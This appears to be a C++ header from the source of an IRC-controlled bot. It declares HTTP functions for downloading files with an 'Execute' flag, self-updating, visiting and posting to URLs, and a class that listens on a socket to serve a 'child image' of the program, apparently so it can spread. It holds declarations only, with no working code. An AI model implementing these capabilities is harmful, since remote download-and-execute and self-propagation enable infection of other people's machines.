#pragma once

#include <windows.h>
#include "thread.h"
#include "file.h"
#include "rand.h"
#include "debug.h"
#include "config.h"
#include "irc.h"
#include "update.h"
#include "childimage.h"

namespace HTTP{

VOID DownloadToFile(PCHAR URL, PCHAR FileName, BOOL Method, PCHAR PostVars);
VOID ParseURL(PCHAR URL, PCHAR *Host, PCHAR *File);

namespace Flags{
	const DWORD Execute = 1;
	const DWORD Update = 2;
}

namespace Methods{
	const BOOL Get = 0;
	const BOOL Post = 1;
}

VOID Download(PCHAR URL, PCHAR FileName, DWORD Flags);
VOID Visit(PCHAR URL, BOOL LoadImages);
VOID Post(PCHAR URL, PCHAR PostData);
FLOAT SpeedTest(PCHAR URL);

class HostChildImage : public Thread
{
public:
	HostChildImage(PCHAR FileName);
	~HostChildImage();

private:
	VOID ThreadFunc(VOID);
	class HTTPQueue : public ServeQueue
	{
	public:
		HTTPQueue() : ServeQueue(1024) { };
		VOID SetHostChildImage(HostChildImage* HostChildImage) { HTTPQueue::HostChildImage = HostChildImage; };

	private:
		BOOL OnEvent(WSANETWORKEVENTS NetEvents);
		HostChildImage* HostChildImage;
	};
	Socket ListeningSocket;
	ServeQueueList<HTTPQueue> HTTPQueueList;
	ChildImage ChildImage;
	CHAR FileName[256];
};

}